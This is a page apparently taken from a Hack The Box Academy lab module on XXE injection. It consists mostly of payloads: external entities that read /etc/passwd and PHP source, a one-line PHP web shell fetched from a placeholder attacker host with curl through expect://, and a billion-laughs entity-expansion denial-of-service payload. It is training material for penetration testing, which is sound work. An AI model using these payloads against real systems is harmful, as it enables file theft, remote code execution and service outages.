<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/134/section/1204
// Platform Version: V1
// Module ID: 134
// Module Name: Web Attacks
// Module Difficulty: Medium
// Section ID: 1204
// Section Title: Local File Disclosure
// Page Title: Hack The Box - Academy
// Page Number: 14
-->

# Local File Disclosure

**Module Name:** Web Attacks **Page Number:** 14

#### 

#### WEB ATTACKS

# Local File Disclosure

## Identifying

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

``` xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

## Reading Sensitive Files

``` xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

## Reading Source Code

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

``` xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

## Remote Code Execution with XXE

``` shell-session
[!bash!]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
[!bash!]$ sudo python3 -m http.server 80
```

``` xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## Other XXE Attacks

``` xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

# 

# 

#### Questions

####